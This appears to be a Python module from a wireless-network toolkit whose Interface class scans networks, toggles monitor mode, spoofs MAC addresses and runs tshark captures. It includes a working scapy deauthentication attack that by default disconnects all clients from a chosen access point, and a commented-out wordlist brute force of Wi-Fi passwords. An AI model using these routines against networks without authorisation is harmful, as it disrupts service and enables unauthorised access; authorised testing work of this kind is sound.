
if __name__ != '__main__':
    from core.utilities import *
else:
    from utilities import *

from subprocess import Popen
from time import sleep
import signal
import wifi
import os

TOOLS = ["iwconfig -h", "ifconfig -h", "macchanger -h"]

dir_path = os.path.dirname(os.path.realpath(__file__))
WORDLIST = dir_path + "probable-v2-wpa-top4800.txt"

class FailedToSetDown(Exception):
    """ Gets raised when the interface can not be set down """
    def __init__(self, interface):
        super().__init__(f"Failed to set {interface} down")

class FailedToSetUp(Exception):
    """ Gets raised when the interface can not be set up """
    def __init__(self, interface):
        super().__init__(f"Failed to set {interface} up")

class FailedToSetModeManaged(Exception):
    """ Gets raised when the interface can not be set to managed mode"""
    def __init__(self, interface):
        super().__init__(f"Failed to set {interface} mode managed")

class FailedToSetModeMonitor(Exception):
    """ Gets raised when the interface can not be set to monitor mode """
    def __init__(self, interface):
        super().__init__(f"Failed to set {interface} into monitor mode")

class RequiredToolNotInstalled(Exception):
    """ Gets raised when a required tool is not installed """
    def __init__(self, tool: str):
        super().__init__(f"{tool} is not installed!")

class InvalidInterface(Exception):
    """ Gets raised when the file /sys/class/net/interface/operstate is not found """
    def __init__(self, interface, message: str = None):
        self.interface = interface
        if not message:
            message = f"{interface} is not a valid inteface"
        super().__init__(message)


InterfaceErrors = (FailedToSetDown, FailedToSetUp, FailedToSetModeManaged, FailedToSetModeMonitor, InvalidInterface, wifi.exceptions.InterfaceError)
FailedToSetStatus = (FailedToSetDown, FailedToSetUp)
FailedToSetMode = (FailedToSetModeManaged, FailedToSetModeMonitor)

class Interface:

    def __str__(self) -> str:
        return self.interface_name

    # def __eq__(self, intertfaceObject) -> bool:
    #     """ Checks to see if the inteface names are the same
    #     """
    #     try:
    #         return self.interface_name == intertfaceObject.interface_name
    #     except AttributeError:
    #         return False

    def __bool__(self) -> bool:
        """ Checks the operstate file to check the current status        
        """
        content = get_file_content(self.operstate)
        if not content or "up" not in content:
            return False
        return True

    def __init__(self, interface_name: str) -> None:
        """ Creates an Interface Manager

        Keyword Arguments
        interface_name -- Interface name to control
        """
        self.interface_name = interface_name
        self.mode = None
        self.tshark_session = False
        self.macchanger = True
        self.operstate = f"/sys/class/net/{self}/operstate"
        self.__are_tools_installed()
        if not os.path.exists(self.operstate):
            raise InvalidInterface(self)

    def __are_tools_installed(self):
        # Macchanger isnt a required tool
        # calling change_mac_address() with macchanger as False
        # will raise a RequiredToolNotInstalled exception
        for tool in TOOLS:
            result = did_os_command_succeed(tool)
            if not result and tool == "macchanger -h":
                self.macchanger = False
            elif not result:
                raise RequiredToolNotInstalled(tool)

    def get_local_networks(self, hide_hidden = True) -> list:
        """ Locates nearby networks
        
        Keyword arguments
        hide_hidden -- If set to false hidden networks are shown

        Return
        A list of local networks
        """
        # if self.mode != "managed":
        #     if not self.set_mode_managed():
        #         return []
        networks = list(set(wifi.Cell.all(self.interface_name)))
        if not networks or not hide_hidden:
            return networks
        return [
            network
            for network in networks
            if format_string(network.ssid) is not None
        ]

#     def create_hotspot(self, ssid: str, password: str = None, encryption = None) -> bool:
#         """ Creates a WiFi hotspot
#         Keyword Arguments
#         ssid        -- Network name 
#         password    -- Network password (Optional) 
#         encryption  -- Network Encryption type (Optional)

#         Return
#         True if the network was created
#         """
#         command = f'''
# nmcli connection add \
#     type wifi \
#     con-name "My Hotspot" \
#     autoconnect no \
#     wifi.mode ap \
#     wifi.ssid "{ssid}" \
#     ipv4.method shared \
#     ipv6.method shared'''
#         if password:
#             command = f'nmcli dev wifi hotspot ifname wlan0 ssid {ssid} password {password}'

#         if did_os_command_succeed(command, debug=True):
#             return did_os_command_succeed("nmcli dev wifi show-password", debug=True)

    # def disable_hotspot(ssid: str) -> bool:
    #     """

    #     """
    #     return did_os_command_succeed(f"nmcli connection down {ssid}")   

    def join_network(self, ssid: str, password: str = None) -> bool:
        """ Connects to wireless networks

        Keyword arguments:
        ssid     -- SSID of network to connect to
        password -- Password if required (Optional)

        Returns:
        True if we can connect and an ip address was fetched
        """
        if self.mode != "managed": 
            if not self.set_mode_managed():
                return False
        command = f"sudo iwconfig {self} essid {ssid} key {password}"
        if not password:
            command = f"sudo iwconfig {self} essid {ssid}"
        if did_os_command_succeed(command) and self.fetch_ip_address_from_router():
            return True
        return False

    def fetch_ip_address_from_router(self) -> bool:
        """ Uses dhclient to fetch an ip address from the network

        Returns:
        True if an ip address was fetched
        """
        return did_os_command_succeed(f"sudo dhclient {self}")

#     def brute_force_wifi_network(self, ssid: str, wordlist: None) -> str:
#         """ Brute Forces the WiFi Network

#         Keywork Arguments
#         ssid         -- SSID or MAC address of network to brute force
#         wordlist     -- Alternative Wordlist to use
#         max_attempts -- Max amount of password to attempt

#         Return
#         WiFi password or None
#         """
#         if not self:
#             return None
#         try:
#             if not wordlist:
#                 wordlist = WORDLIST
#             with open(wordlist) as wordlist:
#                 for password in wordlist:
#                     if self.join_network(ssid, password):
#                         while tries < 3:
#                             if get_os_command_result("iwgetid -r") == ssid:
#                                 print(ssid, password)
#                                 return password
#                             sleep(2)
#                             tries += 1
#                         return password
#         except (EnvironmentError):
#             return None`

    def deauth_target(
        self,
        bssid_address: str,
        target_mac_address: str = "ff:ff:ff:ff:ff:ff",
        packet_count: int = 5,
        frequency: int = 0,
        verbose: int = 0,
    ) -> bool:
        """ Deauth's a target/router
        
        Keyword arguments:
        
        bssid_address      --  MAC address of the router to deauth
        target_mac_address --  MAC address of the target device to deauth (default: ff:ff:ff:ff:ff:ff) (ALL)
        packet_count       --  Amount of deauth frames to send default: 5000
        frequency          --  Time between packets sending
        verbose            --  Scapy verbosity

        Return
        False if the network was't deauthed
        """
        from scapy.all import (
            RadioTap,  # Adds additional metadata to an 802.11 frame
            Dot11,  # For creating 802.11 frame
            Dot11Deauth,  # For creating deauth frame
            sendp,  # for sending packets
        )
        if self.mode != "monitor" and not self.set_mode_monitor():
            return False
        dot11 = Dot11(
            addr1=target_mac_address, addr2=bssid_address, addr3=bssid_address
        )
        frame = RadioTap() / dot11 / Dot11Deauth()
        sendp(
            frame,
            iface=self.interface_name,
            count=packet_count,
            inter=frequency,
            verbose=verbose,
        )
        self.set_mode_managed()
        return True

    def set_down(self) -> bool:
        """ Sets the primary adapter down

        Return:
        True if the adapter was set down
        """
        if not self:
            return True
        if not did_os_command_succeed(f"sudo ifconfig {self} down"):
            raise FailedToSetDown(self)
        sleep(5)
        return True

    def set_up(self) -> bool:
        """ Sets the primary adapter up

        Return:
        True if the adapter was set up
        """
        if self:
            return True
        if not did_os_command_succeed(f"sudo ifconfig {self} up"):
             raise FailedToSetUp(self)
        sleep(5)
        return True

    def change_mac_address(self, mac_address: str = None):
        """ Changes the mac address using mac changer
        
        Keyword argumets: 
        mac_address -- Mac address to change to (optional)
                       If not configured the mac address 
                       will be random

        Return
        True if the adapter's mac address was changed
        """
        if not self.macchanger:
            raise RequiredToolNotInstalled("macchanger")
        command = f"sudo macchanger -b -r {self}"
        if mac_address:
            command = f'sudo macchanger -m "{mac_address}" {self}'
        self.set_down()
        if not did_os_command_succeed(command):
            return False
        self.set_up()
        return True

    def set_mode_monitor(self) -> bool:
        """ Sets the network interface into monitor mode
        """
        if not self.set_down():
            return False
        if not did_os_command_succeed(
            f"sudo iwconfig {self} mode monitor"
        ):
            raise FailedToSetModeMonitor(self)
        self.set_up()
        self.mode = "monitor"
        return True

    def set_mode_managed(self) -> bool:
        """ Sets the network interface into managed mode
        """
        if not self.set_down():
            return False
        if not did_os_command_succeed(
            f"sudo iwconfig {self} mode managed"
        ):
            raise FailedToSetModeManaged(self)
        self.mode = "managed"
        self.set_up()
        return True

    def restart(self) -> bool:
        """ Restart the primary network adapter
        """
        return self.set_down() and self.set_up()

    def start_network_capture(self, arguments: str) -> None:
        """ Starts a tshark session
        
        Keyword Arguments
        arguments -- arguments for tshark, exclude the interface name
        """
        self.tshark_session = Popen(f"sudo tshark -i {self} {arguments}", shell=True, preexec_fn=os.setsid)

    def stop_network_capture(self) -> None:
        """ Sends a SIGTERM to the tshark process
        """
        os.killpg(self.tshark_session.pid, signal.SIGTERM)

    def troubleshoot(self, desired_mode: str = None) -> None:
        """ Attempts some general troubleshooting to fix the interface

        Waits 15 seconds, then if the adapter is disabled, it enables it.
        If the network adater was enabled it restarts it.

        desired_mode -- what mode to set the interface to (monitor/managed)
        """
        sleep(15)
        if not self:
            self.set_up()
        else:
            self.restart()
        match desired_mode: 
            case "monitor":
                self.set_mode_monitor()
            case "managed":
                self.set_mode_managed()
        if not self:
            self.set_up()

    def run_tests(self, tries = 3) -> bool:
        """
        Keyword Arguments:
        monitor_mode -- Set to false if you dont want to test monitor mode tests

        Return 
        True if tests run succesfully
        """
        count = 0
        while count < tries:
            assert self.set_down(), f"Failed to set {self} down"
            assert self.set_up(), f"Failed to set {self} up"
            assert self.change_mac_address(), f"Failed to change mac address"
            disable_all_networking_services()
            assert self.set_mode_monitor(), f"Failed to set {self} monitor mode"
            start_all_networking_services()
            assert self.set_mode_managed(), f"Failed to set {self} managed"
            networks = self.get_local_networks()
            assert networks != 0, f"Failed to locate nearby networks on {self}"
            count += 1
        self.stop()
        return True
        
    def stop(self) -> None:
        """ Stops the network capture and sets the mode back to managed
        """
        if self.tshark_session:
            self.stop_network_capture()
        if self.mode != "managed":
            self.set_mode_managed()
        if not self:
            self.set_up()


def run_module_test(interface_name: str = None) -> bool:
    if not interface_name:
        interface_name = input("[?] Enter your interface name: ")
    interface = Interface(interface_name)
    return interface.run_tests()

if __name__ == "__main__":
    # Change the interface name to avoid the prompt
    print(run_module_test(interface_name=None))
